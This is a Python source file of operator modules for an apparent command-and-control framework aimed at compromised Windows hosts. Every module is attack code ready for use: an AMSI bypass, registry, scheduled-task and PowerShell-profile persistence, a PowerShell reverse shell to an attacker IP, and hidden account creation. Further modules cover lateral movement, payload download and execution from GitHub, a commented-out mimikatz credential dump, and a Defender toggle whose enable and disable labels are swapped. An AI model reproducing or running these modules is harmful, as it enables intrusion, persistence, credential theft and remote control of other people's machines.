from modules.agent_script_interpreter import BaseCommand
from modules.agent import BaseAgent
import time


######################################
# 2. System Recon (Multi-step)
######################################
class SystemRecon(BaseCommand):
    command_name = "system_recon"
    command_help = (
        "\tUsage: `system_recon` [exfiltration_url] [temp_filepath]\n"
        "\tAggregates system information and network connections.\n"
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        self.agent_class = BaseAgent(agent_id)

        self.command_ids = []

    # this is how we are gonna do it
    def run(self):
        # list of commands to run
        cmds = {
            "shell ver": "system.os",
            "shell whoami": "system.username",
            "shell hostname": "system.hostname",
            "shell powershell -c \"(Get-NetIPAddress -AddressFamily IPv4 | Select-Object -ExpandProperty IPAddress) -join ', '\"": "network.internal_ip",
            'shell powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"': "network.domain",
            'shell powershell -c "(Get-NetIPConfiguration | Where-Object IPv4DefaultGateway).IPv4DefaultGateway.NextHop"': "network.external_ip",
        }

        for cmd, location in cmds.items():
            self.agent_class.store_command_response_on_callback(cmd, location)
            command_ids = self.agent_class.enqueue_command(cmd)
            self.command_ids.append(command_ids)

        # must return list of command ID's that were queued.
        return self.command_ids


######################################
# 3. AMSI Bypass and PowerShell Execution
######################################
class AMSIBypassPS(BaseCommand):
    command_name = "amsi_bypass_ps"
    command_help = (
        "\tUsage: `amsi_bypass_ps` <powershell_command>\n"
        "\tBypasses AMSI and executes a PowerShell command.\n"
        "\tWARNING: Not OpSec Safe."
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if not args_list:
            raise ValueError("Usage: amsi_bypass_ps <powershell_command>")
        self.ps_command = " ".join(args_list)
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        try:
            full_ps_cmd = (
                'powershell -Command "'
                "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
                ".GetField('amsiInitFailed','NonPublic,Static')"
                ".SetValue($null,$true); "
                f'{self.ps_command}"'
            )
            bypass_cmd = f"shell {full_ps_cmd}"
            bypass_id = self.agent_class.enqueue_command(bypass_cmd)
            time.sleep(2)
            bypass_resp = self.agent_class.get_one_command_and_response(bypass_id).get(
                "response", ""
            )
            if "error" in bypass_resp.lower():
                print("AMSI bypass execution failed:", bypass_resp)
            else:
                print("AMSI bypass and PowerShell command executed successfully.")
                self.agent_class.store_response(bypass_id, bypass_resp)
        except Exception as e:
            print("AMSIBypassPS encountered an error:", e)


######################################
# 4. Registry-Based Persistence
######################################
class RegistryPersistence(BaseCommand):
    command_name = "registry_persistence"
    command_help = (
        "\tUsage: `registry_persistence <path_to_executable>`\n"
        "\tAdds a registry Run key for persistence.\n"
        "\tThe specified executable will run at logon."
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if len(args_list) < 1:
            raise ValueError("Usage: registry_persistence <path_to_executable>")
        self.exe_path = args_list[0]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        reg_cmd = (
            f"shell reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
            f'/v PersistApp /d "{self.exe_path}" /f'
        )
        reg_id = self.agent_class.enqueue_command(reg_cmd)
        time.sleep(1)
        reg_resp = self.agent_class.get_one_command_and_response(reg_id).get(
            "response", ""
        )
        if "error" in reg_resp.lower():
            print("Registry persistence failed:", reg_resp)
        else:
            print("Registry persistence established successfully.")
            self.agent_class.store_response(reg_id, reg_resp)


######################################
# 5. Scheduled Task Persistence
######################################
class ScheduledTaskPersistence(BaseCommand):
    command_name = "scheduled_task_persistence"
    command_help = (
        "\tUsage: `scheduled_task_persistence <filepath>`\n"
        "\tSchedules an .exe to run at logon via Windows schtasks.\n"
        "\tThe specified file will be executed at logon with high privileges."
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if len(args_list) < 1:
            raise ValueError("Usage: scheduled_task_persistence <filepath>")
        self.exe_path = args_list[0]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        try:
            schedule_cmd = (
                f'shell schtasks /create /tn "PersistentTask" /tr "{self.exe_path}" '
                "/sc onlogon /rl highest"
            )
            schedule_id = self.agent_class.enqueue_command(schedule_cmd)
            time.sleep(1)
            schedule_resp = self.agent_class.get_one_command_and_response(
                schedule_id
            ).get("response", "")
            if "error" in schedule_resp.lower():
                raise Exception("Scheduling persistence task failed: " + schedule_resp)
            else:
                print("Scheduled task persistence established successfully.")
                self.agent_class.store_response(schedule_id, schedule_resp)
        except Exception as e:
            print("ScheduledTaskPersistence encountered an error:", e)


######################################
# 5. PS Profile Persistence
######################################
class PSProfilePersistence(BaseCommand):
    """
    Persistence via PS profiles.
    Step 1: Allow running scripts on system
        `Set-ExecutionPolicy Unrestricted`

    Step 2: Get profile, if not exist, create profile
        if (!(Test-Path -Path $PROFILE)) {
            New-Item -ItemType File -Path $PROFILE -Force
        }

    Step 3: Append to profile


    """

    command_name = "ps_profile_persistence"
    command_help = (
        "\tUsage: `ps_profile_persistence <command_to_run>`\n"
        "\tUses powershell profiles to establish persistence (May need admin...)\n"
        "\tThe specified command will be run anytime the user pops powershell."
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if len(args_list) < 1:
            raise ValueError("Usage: ps_profile_persistence <command>")
        self.persistence_command = args_list[0]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        try:
            # needs to be ordered, so sync execution here
            self.agent_class.enqueue_command("sync")
            ## add if/else for system wide or current user
            adjust_execution_policy = (
                f"shell powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser"
            )
            self.agent_class.enqueue_command(adjust_execution_policy)

            check_for_profile = "shell powershell -c 'if (!(Test-Path -Path $PROFILE)) {New-Item -ItemType File -Path $PROFILE -Force}'"
            self.agent_class.enqueue_command(check_for_profile)

            # move to writefile arg in agent
            write_command = f"shell echo '{self.persistence_command}' >> $PROFILE"
            self.agent_class.enqueue_command(write_command)

            self.agent_class.enqueue_command("async")

            # schedule_cmd = (
            #     f'shell schtasks /create /tn "PersistentTask" /tr "{self.exe_path}" '
            #     "/sc onlogon /rl highest"
            # )
            # schedule_id = self.agent_class.enqueue_command(schedule_cmd)
            # time.sleep(1)
            # schedule_resp = self.agent_class.get_one_command_and_response(
            #     schedule_id
            # ).get("response", "")
            # if "error" in schedule_resp.lower():
            #     raise Exception("Scheduling persistence task failed: " + schedule_resp)
            # else:
            #     print("Scheduled task persistence established successfully.")
            #     self.agent_class.store_response(schedule_id, schedule_resp)
        except Exception as e:
            print("ScheduledTaskPersistence encountered an error:", e)


######################################
# 6. Reverse Shell (PowerShell)
######################################
class ReverseShell(BaseCommand):
    command_name = "reverse_shell"
    command_help = (
        "\tUsage: `reverse_shell <attacker_ip> <attacker_port>`\n"
        "\tLaunches a reverse shell using PowerShell.\n"
        "\tThe reverse shell is executed using `start_process` with hidden window mode."
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if len(args_list) < 2:
            raise ValueError("Usage: reverse_shell <attacker_ip> <attacker_port>")
        self.attacker_ip = args_list[0]
        self.attacker_port = args_list[1]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        try:
            ps_payload = (
                f"$client = New-Object System.Net.Sockets.TCPClient('{self.attacker_ip}',{self.attacker_port});"
                "$stream = $client.GetStream();"
                "[byte[]]$bytes = 0..65535|%{0};"
                "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
                "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
                "$sendback = (iex $data 2>&1 | Out-String );"
                "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                "$stream.Write($sendbyte,0,$sendbyte.Length);"
                "$stream.Flush()};"
                "$client.Close()"
            )
            rev_cmd = f'start_process powershell -nop -w hidden -c "{ps_payload}"'
            rev_id = self.agent_class.enqueue_command(rev_cmd)
            time.sleep(2)
            rev_resp = self.agent_class.get_one_command_and_response(rev_id).get(
                "response", ""
            )
            if "error" in rev_resp.lower():
                print("Reverse shell execution failed:", rev_resp)
            else:
                print("Reverse shell launched successfully.")
                self.agent_class.store_response(rev_id, rev_resp)
        except Exception as e:
            print("ReverseShell encountered an error:", e)


######################################
# 7. Kill Process
######################################
class KillProcess(BaseCommand):
    command_name = "kill_process"
    command_help = (
        "\tUsage: `kill_process <PID>`\n"
        "\tTerminates a process by its PID.\n"
        "\tUse with caution to avoid terminating critical processes."
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if len(args_list) < 1:
            raise ValueError("Usage: kill_process <PID>")
        self.pid = args_list[0]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        kill_cmd = f"kill_process {self.pid}"
        kill_id = self.agent_class.enqueue_command(kill_cmd)
        time.sleep(1)
        kill_resp = self.agent_class.get_one_command_and_response(kill_id).get(
            "response", ""
        )
        if "error" in kill_resp.lower():
            print(f"Failed to kill process {self.pid}:", kill_resp)
        else:
            print(f"Process {self.pid} terminated successfully.")
            self.agent_class.store_response(kill_id, kill_resp)


######################################
# 8. Create User
######################################
class CreateUser(BaseCommand):
    command_name = "create_user"
    command_help = (
        "\tUsage: `create_user <username> <password>`\n"
        "\tCreates a new local user account.\n"
        "\tThe new account is added using the net user command."
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if len(args_list) < 2:
            raise ValueError("Usage: create_user <username> <password>")
        self.username = args_list[0]
        self.password = args_list[1]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        create_cmd = f"shell net user {self.username} {self.password} /add"
        create_id = self.agent_class.enqueue_command(create_cmd)
        time.sleep(1)
        create_resp = self.agent_class.get_one_command_and_response(create_id).get(
            "response", ""
        )
        if "error" in create_resp.lower():
            print("User creation failed:", create_resp)
        else:
            print(f"User {self.username} created successfully.")
            self.agent_class.store_response(create_id, create_resp)


######################################
# 9. Lateral Movement
######################################
class LateralMovement(BaseCommand):
    command_name = "lateral_movement"
    command_help = (
        "\tUsage: `lateral_movement <drive_letter> <remote_share> <remote_exe_path>`\n"
        "\tMaps a network drive and executes a remote executable to pivot.\n"
        "\tExample: `lateral_movement Z \\\\192.168.1.100\\share pivot.exe`"
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if len(args_list) < 3:
            raise ValueError(
                "Usage: lateral_movement <drive_letter> <remote_share> <remote_exe_path>"
            )
        self.drive_letter = args_list[0]
        self.remote_share = args_list[1]
        self.remote_exe = args_list[2]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        map_cmd = f"shell net use {self.drive_letter}: {self.remote_share}"
        map_id = self.agent_class.enqueue_command(map_cmd)
        time.sleep(2)
        map_resp = self.agent_class.get_one_command_and_response(map_id).get(
            "response", ""
        )
        if "error" in map_resp.lower():
            print("Network drive mapping failed:", map_resp)
            return
        print("Network drive mapped successfully.")
        exec_cmd = f"start_process {self.drive_letter}:\\{self.remote_exe}"
        exec_id = self.agent_class.enqueue_command(exec_cmd)
        time.sleep(2)
        exec_resp = self.agent_class.get_one_command_and_response(exec_id).get(
            "response", ""
        )
        if "error" in exec_resp.lower():
            print("Remote execution failed:", exec_resp)
        else:
            print("Remote executable launched successfully.")
            self.agent_class.store_response(exec_id, exec_resp)


######################################
# 9. DK Conquest - Ping Machine
######################################
class ScheduledTaskPingPersistence(BaseCommand):
    command_name = "scheduled_task_ping_persistence"
    command_help = (
        "\tUsage: `scheduled_task_ping_persistence <target_host>`\n"
        "\tSchedules a task to ping a target host every 30 seconds.\n"
        "\tThe task will run at logon with high privileges and immediately after creation."
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        if len(args_list) < 1:
            raise ValueError("Usage: scheduled_task_ping_persistence <target_host>")
        self.target_host = args_list[0]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        try:
            # Create a task to ping the target every 30 seconds and also start it immediately
            schedule_cmd = (
                f'shell schtasks /create /tn "PingTaskEvery30Seconds" /tr "ping {self.target_host} -n 1" '
                "/sc onlogon /rl highest /f /st 00:00 /du 9999:59:59 /sc minute /mo 1"
            )
            # Enqueue the command to create the task
            schedule_id = self.agent_class.enqueue_command(schedule_cmd)
            time.sleep(1)
            # Get the response for the scheduled task creation
            schedule_resp = self.agent_class.get_one_command_and_response(
                schedule_id
            ).get("response", "")

            if "error" in schedule_resp.lower():
                raise Exception("Scheduling ping task failed: " + schedule_resp)

            # After the task is created, immediately run the task
            run_cmd = 'shell schtasks /run /tn "PingTaskEvery30Seconds"'
            run_id = self.agent_class.enqueue_command(run_cmd)
            time.sleep(1)
            run_resp = self.agent_class.get_one_command_and_response(run_id).get(
                "response", ""
            )

            if "error" in run_resp.lower():
                raise Exception("Running ping task immediately failed: " + run_resp)

            print(
                "Scheduled task to ping target every 30 seconds established and run immediately."
            )
            self.agent_class.store_response(schedule_id, schedule_resp)
            self.agent_class.store_response(run_id, run_resp)

        except Exception as e:
            print("ScheduledTaskPingPersistence encountered an error:", e)


######################################
# 10. Credential Dumping (Mimikatz)
######################################
# The following module downloads mimikatz and then executes it.
# Uncomment and adjust if needed.
#
# class CredentialDump(BaseCommand):
#     command_name = "credential_dump"
#     command_help = (
#         "CredentialDump:\n"
#         "Usage: credential_dump <mimikatz_download_url> <mimikatz_script_filepath>\n"
#         "Downloads mimikatz and dumps credentials using mimikatz techniques.\n"
#         "Downloads mimikatz.exe from the specified URL and executes it with the provided script."
#     )
#
#     def __init__(self, command, args_list, agent_id):
#         super().__init__(command, args_list, agent_id)
#         if len(args_list) < 2:
#             raise ValueError("Usage: credential_dump <mimikatz_download_url> <mimikatz_script_filepath>")
#         self.download_url = args_list[0]
#         self.script_path = args_list[1]
#         self.agent_class = BaseAgent(agent_id)
#
#     def run(self):
#         download_cmd = f"http_get {self.download_url} mimikatz.exe"
#         download_id = self.agent_class.enqueue_command(download_cmd)
#         time.sleep(3)
#         download_resp = self.agent_class.get_one_command_and_response(download_id).get("response", "")
#         if "error" in download_resp.lower():
#             print("Mimikatz download failed:", download_resp)
#             return
#         else:
#             print("Mimikatz downloaded successfully.")
#
#         mimikatz_cmd = f"start_process mimikatz.exe"
#         mimikatz_id = self.agent_class.enqueue_command(mimikatz_cmd)
#         time.sleep(3)
#         mimikatz_resp = self.agent_class.get_one_command_and_response(mimikatz_id).get("response", "")
#         if "error" in mimikatz_resp.lower():
#             print("Credential dumping failed:", mimikatz_resp)
#         else:
#             print("Credential dumping executed. Check stored output for credentials.")
#             self.agent_class.store_response(mimikatz_id, mimikatz_resp)


######################################
# 9. Fun - DesktopGoose
######################################
class DesktopGoose(BaseCommand):
    command_name = "goose"
    command_help = "\tUsage: `goose`\n" "\tDownloads & runs desktop goose\n"

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        # self.target_host = args_list[0]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        try:
            make_temp = "shell mkdir C:\Temp"
            download_goose = "shell powershell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/ryanq47/DakotaConquestPayloads/archive/refs/heads/main.zip' -OutFile 'C:\Temp\\archive.zip'; Expand-Archive -Path 'C:\Temp\\archive.zip' -DestinationPath 'C:\Temp'; rm C:\Temp\\archive.zip; mv C:\Temp\DakotaConquestPayloads-main C:\Temp\somefolder\""
            remove_1 = "shell powershell -c 'rm C:\Temp\somefolder\Linux -r'"
            remove_2 = "shell powershell -c 'rm C:\Temp\somefolder\Python -r'"
            remove_3 = "shell powershell -c 'rm C:\Temp\somefolder\Windows -r'"

            run_goose = "shell C:\Temp\somefolder\goose\GooseDesktop.exe"

            # Enqueue the command to create the task
            self.agent_class.enqueue_command(make_temp)
            self.agent_class.enqueue_command("execution_mode sync")
            self.agent_class.enqueue_command(download_goose)
            self.agent_class.enqueue_command("execution_mode async")
            self.agent_class.enqueue_command(remove_1)
            self.agent_class.enqueue_command(remove_2)
            self.agent_class.enqueue_command(remove_3)
            self.agent_class.enqueue_command(run_goose)

        except Exception as e:
            print("ScheduledTaskPingPersistence encountered an error:", e)


######################################
# 10. Defender
######################################
class Defender(BaseCommand):
    command_name = "defender"
    command_help = (
        "\tUsage: `defender <arg>`\n"
        "\tModify defender, valid args are: `enable`, `disable`\n"
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        self.defender_on_off_arg = args_list[0]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        try:
            if self.defender_on_off_arg == "enable":
                enable_command = 'shell powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true'
                self.agent_class.enqueue_command(enable_command)

            elif self.defender_on_off_arg == "disable":
                disable_command = 'shell powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false'
                self.agent_class.enqueue_command(disable_command)

        except Exception as e:
            print("Defender encountered an error:", e)


######################################
# 10. RDP - On/Off
######################################
class RDP(BaseCommand):
    command_name = "rdp"
    command_help = (
        "\tUsage: `rdp <arg>`\n" "\tModify rdp, valid args are: `enable`, `disable`\n"
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        self.defender_on_off_arg = args_list[0]
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        try:
            if self.defender_on_off_arg == "enable":
                enable_rdp = "shell powershell -Command \"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0; Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'\""
                self.agent_class.enqueue_command(enable_rdp)

            elif self.defender_on_off_arg == "disable":
                disable_rdp = "shell powershell -Command \"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 1; Disable-NetFirewallRule -DisplayGroup 'Remote Desktop'\""
                self.agent_class.enqueue_command(disable_rdp)

        except Exception as e:
            print("RDP encountered an error:", e)
